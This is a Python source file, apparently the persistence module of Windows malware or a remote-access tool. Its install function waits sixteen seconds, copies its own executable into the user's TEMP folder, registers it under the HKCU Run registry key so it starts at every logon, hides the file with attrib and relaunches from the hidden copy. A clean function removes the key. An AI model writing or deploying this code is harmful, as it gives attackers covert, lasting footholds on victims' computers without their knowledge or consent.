# -*- coding: utf-8 -*-
import sys
import subprocess
import shutil
import os
import os.path
import config
import time
import subprocess
import string
import random


SERVICE_NAME = config.SERVICE_NAME

if getattr(sys, 'frozen', False):
    EXECUTABLE_PATH = sys.executable
elif __file__:
    EXECUTABLE_PATH = __file__
else:
    EXECUTABLE_PATH = ''
EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)



def install():    
    if not is_installed():    	         
        time.sleep(16)
        output = subprocess.Popen("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME),shell=True)
        shutil.copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)        
        temppath = os.environ["TEMP"] + "/" + EXECUTABLE_NAME
        subprocess.Popen("attrib +h %s"%temppath,shell=True)        
        #exec new file and exit old file
        subprocess.Popen(temppath)  
        sys.exit()


def clean():
    subprocess.Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME,shell=True)
    


def is_installed():
    output = os.popen("reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME)
    if SERVICE_NAME in output.read():
        return True
    else:
        return False

